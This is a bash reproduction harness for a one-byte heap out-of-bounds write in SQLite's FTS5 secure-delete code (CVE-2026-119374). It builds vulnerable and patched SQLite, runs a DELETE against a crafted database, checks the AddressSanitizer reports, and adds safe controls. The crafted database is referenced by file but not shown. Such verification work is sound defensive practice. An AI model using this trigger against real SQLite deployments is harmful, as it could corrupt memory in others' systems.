#!/usr/bin/env bash
# sqlitefts5shell canonical runner (CVE-2026-119374).
#
# Replays the SQLite 3.53.4 FTS5 `fts5DoSecureDelete()` one-byte heap OOB
# WRITE entirely offline from SHA-256-pinned artifacts vendored next to this
# script. It extracts the pinned upstream source tarball, compiles UNMODIFIED
# source for the vulnerable builds, and compiles the same tree with ONLY the
# `ext/fts5/fts5_index.c` code hunk from fix commit d9de6eed for the fixed
# controls. The crafted hexdb transcript is decoded locally (sparse gaps
# zero-filled) into a 5120-byte database. No socket, listener, request, or
# external system is used at run time.
set -u
cd "$(dirname "$0")" || exit 1
BASE=$PWD
PASS=0
FAIL=0
LOG=evidence/run-all-console.log
mkdir -p evidence/gcc evidence/clang build src
: > "$LOG"

log() { printf '%s\n' "$*" | tee -a "$LOG"; }
ok()  { log "PASS $1"; PASS=$((PASS+1)); }
bad() { log "FAIL $1"; FAIL=$((FAIL+1)); }
sha() { sha256sum "$1" | cut -d' ' -f1; }
pin() {
  name=$1; file=$2; want=$3; got=$(sha "$file")
  if [ "$got" = "$want" ]; then
    ok "pin $name"
  else
    log "  want $want"
    log "  got  $got"
    bad "pin $name"
  fi
}

log "sqlitefts5shell runner started $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
log "runner sha256 $(sha run-all.sh)"

# Fetched once during provisioning; never fetched by this runner.
pin vulnerable-source-zip src/sqlite-src-3530400.zip d18fa15aec74d8c17e1463f861095adc01b5ad190256acb4f91d22f0368d232b
pin upstream-fix-patch src/fix-d9de6eed.patch abc7c5fe0d639fbaf3270b67297c653c726cf0efeb4fb6cee56fc44915965ae0
pin code-only-fix-patch src/fix-fts5-index-only.patch 5e648094ba1d8b9f84e036b5a4547efafc8ab28f962101a2d1c3077547d55f5f
pin public-hexdb src/yeonba-fts5corruptB-4.hexdb 4d84273f893d5a359e6316ac511b247b6ca9f8a2640a79b1522a45f1b6033713
pin hexdb-decoder src/decode_hexdb.py e172e9151aa6c8bf0eacb5f06983e0fe720313105093f972a6223b9622b7c770
if [ -f src/run-all.sha256 ]; then
  pin runner-self run-all.sh "$(cat src/run-all.sha256)"
fi

# Deterministic local decode of the sparse `.open --hexdb` transcript.
python3 src/decode_hexdb.py src/yeonba-fts5corruptB-4.hexdb evidence/poc.db > evidence/decode-hexdb.log 2>&1
if [ "$?" -eq 0 ]; then ok "hexdb decoded locally"; else bad "hexdb decode"; fi
pin crafted-database evidence/poc.db 6403bc6c08deee687c69e6d05c680a443f7d994bda19071131db0bd196538fa3

rm -rf build/tree-* build/sqlite3-* build/run-*.db

build_tree() {
  variant=$1 cc=$2 mode=$3
  tag="$variant-$mode-$cc"
  tree="build/tree-$tag"
  mkdir -p "evidence/$cc"
  rm -rf "$tree"
  mkdir -p "$tree"
  unzip -q src/sqlite-src-3530400.zip -d "$tree" || return 1
  src="$tree/sqlite-src-3530400"
  if [ "$variant" = fixed ]; then
    (cd "$src" && patch -p1 -t < "$BASE/src/fix-fts5-index-only.patch") \
      > "evidence/$cc/$tag-patch.log" 2>&1 || return 1
  fi
  if [ "$cc" = clang ]; then dbg='-gline-tables-only'; opt='-O0'; else dbg='-g'; opt='-O1'; fi
  if [ "$mode" = asan ]; then san='-fsanitize=address'; else san=''; fi
  (cd "$src" && CC="$cc" CFLAGS="$san $dbg $opt -DSQLITE_ENABLE_FTS5" \
    ./configure --disable-tcl) > "evidence/$cc/$tag-configure.log" 2>&1 || return 1
  (cd "$src" && make -j2 sqlite3) > "evidence/$cc/$tag-build.log" 2>&1 || return 1
  cp "$src/sqlite3" "build/sqlite3-$tag" || return 1
  log "built build/sqlite3-$tag"
}

for spec in "vuln gcc asan" "fixed gcc asan" "vuln gcc plain" "vuln clang asan" "fixed clang asan"; do
  set -- $spec
  if build_tree "$1" "$2" "$3"; then ok "build $1-$2-$3"; else bad "build $1-$2-$3"; fi
done

VTR=build/tree-vuln-asan-gcc/sqlite-src-3530400
FTR=build/tree-fixed-asan-gcc/sqlite-src-3530400
VEXT="$VTR/ext/fts5/fts5_index.c"
FEXT="$FTR/ext/fts5/fts5_index.c"
VAMAL="$VTR/sqlite3.c"
FAMAL="$FTR/sqlite3.c"

pin vulnerable-fts5-index-source "$VEXT" f344bce47dd5c8ef72f8f3b8354edf7ab0bfb2109364481e8f5e580c919c0842
pin fixed-fts5-index-source "$FEXT" 189f31d3ab50c44f427d49a86bc2d537be5a621f00f9b7889eff556d936b24f2
pin vulnerable-amalgamation "$VAMAL" b1dd5d74ec7f29055a6684fa06fb3c2f6821c87dd38f9a458dfd2e8a1db28189
pin fixed-amalgamation "$FAMAL" 1492a66c2059c836c35d3bbe74ca799d2610fd3c5542a7fe16f2d81b10dbfcc5

VLINE=$(grep -n 'nPg = iPgIdx;' "$VEXT" | cut -d: -f1)
FLINE=$(grep -n 'nNewPg = iPgIdx;' "$FEXT" | cut -d: -f1)
GUARD=$(grep -n 'iKeyIn>nPg' "$FEXT" | cut -d: -f1)
VW=$(grep -n 'nPg += sqlite3Fts5PutVarint' "$VAMAL" | cut -d: -f1)
FW=$(grep -n 'nNewPg += sqlite3Fts5PutVarint' "$FAMAL" | cut -d: -f1)
if [ "$VLINE" = 5525 ] && [ "$FLINE" = 5525 ] && [ "$GUARD" = 5532 ] && \
   [ "$VW" = 256373 ] && [ "$FW" = 256378 ]; then
  ok "source markers vuln ext=$VLINE amal=$VW fixed ext=$FLINE guard=$GUARD amal=$FW"
else
  log "  got vuln=$VLINE/$VW fixed=$FLINE/$GUARD/$FW"
  bad "source markers"
fi

ASAN_OPTS=abort_on_error=1:halt_on_error=1:detect_leaks=0

# Crafted DB sanity check on the pinned vulnerable CLI (no ASan build needed).
./build/sqlite3-vuln-plain-gcc -batch evidence/poc.db \
  "SELECT sqlite_version(); SELECT count(*) FROM t;" \
  > evidence/gcc/crafted-db-sanity.log 2>&1
SANITY=$?
if [ "$SANITY" -eq 0 ] && grep -qx '3.53.4' evidence/gcc/crafted-db-sanity.log && \
   grep -qx '1' evidence/gcc/crafted-db-sanity.log; then
  ok "crafted DB sanity: sqlite_version 3.53.4, count(t)=1"
else
  bad "crafted DB sanity"
fi

check_vuln_asan() {
  cc=$1 logfile=$2
  tag="vuln-asan-$cc"
  db="build/run-$tag.db"
  cp evidence/poc.db "$db"
  ASAN_OPTIONS="$ASAN_OPTS" "./build/sqlite3-$tag" -batch "$db" \
    "DELETE FROM t WHERE rowid = 1;" > "$logfile" 2>&1
  rc=$?
  if [ "$rc" -eq 134 ] && \
     grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$logfile" && \
     grep -q 'WRITE of size 1' "$logfile" && \
     grep -q '0 bytes after 640-byte region' "$logfile" && \
     grep -q 'fts5PutVarint64' "$logfile" && \
     grep -q 'sqlite3Fts5PutVarint' "$logfile" && \
     grep -q 'fts5DoSecureDelete' "$logfile" && \
     grep -q 'fts5FlushSecureDelete' "$logfile" && \
     grep -q 'fts5FlushOneHash' "$logfile" && \
     grep -q "sqlite3.c:$VW" "$logfile"; then
    ok "$cc vulnerable ASan WRITE-1 at sqlite3.c:$VW through fts5DoSecureDelete (rc=$rc)"
  else
    log "  rc=$rc"
    bad "$cc vulnerable ASan report"
  fi
}
check_vuln_asan gcc evidence/gcc/vuln-asan-delete.log
check_vuln_asan clang evidence/clang/vuln-asan-delete.log

# Plain non-ASan vulnerable build: observable result of the same DELETE.
cp evidence/poc.db build/run-vuln-plain-gcc.db
./build/sqlite3-vuln-plain-gcc -batch build/run-vuln-plain-gcc.db \
  "SELECT count(*) FROM t; DELETE FROM t WHERE rowid = 1; SELECT count(*) FROM t;" \
  > evidence/gcc/vuln-plain-delete.log 2>&1
PLAIN_RC=$?
if [ "$PLAIN_RC" -eq 0 ] && [ "$(head -n 1 evidence/gcc/vuln-plain-delete.log)" = 1 ] && \
   [ "$(tail -n 1 evidence/gcc/vuln-plain-delete.log)" = 0 ]; then
  ok "plain vulnerable: count 1 -> DELETE rc=$PLAIN_RC -> count 0 (silent in non-ASan build)"
else
  log "  rc=$PLAIN_RC"
  bad "plain vulnerable DELETE"
fi

check_fixed_asan() {
  cc=$1 logfile=$2
  tag="fixed-asan-$cc"
  db="build/run-$tag.db"
  cp evidence/poc.db "$db"
  ASAN_OPTIONS="$ASAN_OPTS" "./build/sqlite3-$tag" -batch "$db" \
    "DELETE FROM t WHERE rowid = 1;" > "$logfile" 2>&1
  rc=$?
  if [ "$rc" -ne 139 ] && [ "$rc" -ne 134 ] && \
     ! grep -q 'ERROR: AddressSanitizer' "$logfile" && \
     { [ "$rc" -eq 0 ] || grep -q 'fts5: corruption' "$logfile"; }; then
    ok "$cc fixed ASan: no report, rc=$rc (corruption error is the expected stop)"
  else
    log "  rc=$rc"
    bad "$cc fixed ASan control"
  fi
}
check_fixed_asan gcc evidence/gcc/fixed-asan-delete.log
check_fixed_asan clang evidence/clang/fixed-asan-delete.log

# Safe control A: read-only MATCH/count on the same crafted DB, no DELETE.
cp evidence/poc.db build/run-safe-read.db
ASAN_OPTIONS="$ASAN_OPTS" ./build/sqlite3-vuln-asan-gcc -batch build/run-safe-read.db \
  "SELECT count(*) FROM t; SELECT a FROM t WHERE t MATCH 'alpha';" \
  > evidence/gcc/safe-read-asan.log 2>&1
SAFE_RC=$?
if [ "$SAFE_RC" -eq 0 ] && ! grep -q 'ERROR: AddressSanitizer' evidence/gcc/safe-read-asan.log && \
   grep -qx 'alpha beta gamma delta echo foxtrot golf hotel' evidence/gcc/safe-read-asan.log; then
  ok "safe crafted-DB read/MATCH: no ASan report, rc=0"
else
  log "  rc=$SAFE_RC"
  bad "safe crafted-DB read/MATCH"
fi

# Safe control B: cleanly created FTS5 secure-delete table, ordinary DELETE.
rm -f build/run-safe-clean.db
SAFE_SQL="CREATE VIRTUAL TABLE t USING fts5(a); INSERT INTO t(t, rank) VALUES('secure-delete', 1); INSERT INTO t VALUES('alpha beta'); INSERT INTO t VALUES('gamma delta'); SELECT count(*) FROM t; DELETE FROM t WHERE rowid=1; SELECT count(*) FROM t;"
ASAN_OPTIONS="$ASAN_OPTS" ./build/sqlite3-vuln-asan-gcc -batch build/run-safe-clean.db \
  "$SAFE_SQL" > evidence/gcc/safe-clean-asan.log 2>&1
SAFE2_RC=$?
if [ "$SAFE2_RC" -eq 0 ] && ! grep -q 'ERROR: AddressSanitizer' evidence/gcc/safe-clean-asan.log && \
   grep -qx '2' evidence/gcc/safe-clean-asan.log && grep -qx '1' evidence/gcc/safe-clean-asan.log; then
  ok "safe clean FTS5 secure-delete table DELETE: no ASan report, rc=0"
else
  log "  rc=$SAFE2_RC"
  bad "safe clean FTS5 secure-delete table"
fi

log "console log $LOG"
log "RESULT PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
